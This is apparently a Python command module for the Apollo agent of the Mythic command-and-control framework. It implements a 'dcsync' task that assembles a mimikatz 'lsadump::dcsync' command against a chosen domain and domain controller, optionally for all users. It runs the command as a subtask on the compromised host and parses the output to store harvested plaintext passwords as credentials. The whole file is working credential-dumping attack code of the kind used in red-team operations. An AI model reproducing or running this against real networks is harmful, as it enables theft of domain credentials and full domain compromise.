from operator import truediv
from mythic_container.MythicCommandBase import *
import json
from uuid import uuid4
from apollo.mythic.sRDI import ShellcodeRDI
from os import path
from mythic_container.MythicRPC import *
import base64
import sys

class DcSyncArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain", 
                type=ParameterType.String, 
                description="Domain to sync credentials from.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True
                    )
                ]),
            CommandParameter(
                name="user",
                cli_name="User",
                display_name="User", 
                default_value="all",
                type=ParameterType.String, 
                description="Username to sync. Defaults to all.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=False
                    )
                ]),
            CommandParameter(
                name="dc",
                cli_name="DC",
                display_name="DC", 
                type=ParameterType.String, 
                description="Domain controller to sync credential material from.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=3,
                        required=False
                    )
                ]),
        ]

    async def parse_arguments(self):
        if len(self.command_line) and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)

            cmd = "lsadump::dcsync /domain:{}".format(
                self.get_arg("domain")
            )
            
            if self.get_arg("dc"):
                cmd += " /dc:{}".format(self.get_arg("dc"))

            if self.get_arg("user") != "all":
                cmd += " /user:{}".format(self.get_arg("user"))
            else:
                cmd += " /all"

            cmd = "\\\"{}\\\"".format(cmd)

            self.add_arg("command", "mimikatz.exe {}".format(cmd))
        else:
            raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(DcSyncCommand.help_cmd))


async def parse_credentials_dcsync(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    responses = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID))
    for output in responses.Responses:
        mimikatz_out = str(output.Response)
        comment = "task {}".format(output.TaskID)
        if mimikatz_out != "":
            lines = mimikatz_out.split("\r\n")

            for i in range(len(lines)):
                line = lines[i]
                if "Username" in line:
                    # Check to see if Password is null
                    if i+2 >= len(lines):
                        break
                    uname = line.split(" : ")[1].strip()
                    realm = lines[i+1].split(" : ")[1].strip()
                    passwd = lines[i+2].split(" : ")[1].strip()
                    if passwd != "(null)":
                        cred_resp = await MythicRPC().execute(
                            "create_credential",
                            task_id=task.SubtaskData.Task.ID,
                            credential_type="plaintext",
                            account=uname,
                            realm=realm,
                            credential=passwd,
                            comment=comment
                        )
                        if cred_resp.status != MythicStatus.Success:
                            raise Exception("Failed to register credential")
    return response


class DcSyncCommand(CommandBase):
    cmd = "dcsync"
    attributes=CommandAttributes(
        dependencies=["execute_pe"]
    )
    needs_admin = False
    help_cmd = "dcsync -Domain [domain] -User [user]"
    description = "Sync a user's Kerberos keys to the local machine."
    version = 3
    author = "@djhohnstein"
    argument_class = DcSyncArguments
    attackmapping = ["T1003.006"]
    script_only = True
    completion_functions = {"parse_credentials_dcsync": parse_credentials_dcsync}

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        sub = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=taskData.Task.ID,
            SubtaskCallbackFunction="parse_credentials_dcsync",
            CommandName="execute_pe",
            Params=taskData.args.get_arg("command")
        ))
        if not sub.Success:
            response.Stderr = f"Failed to run subtask: {sub.Error}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
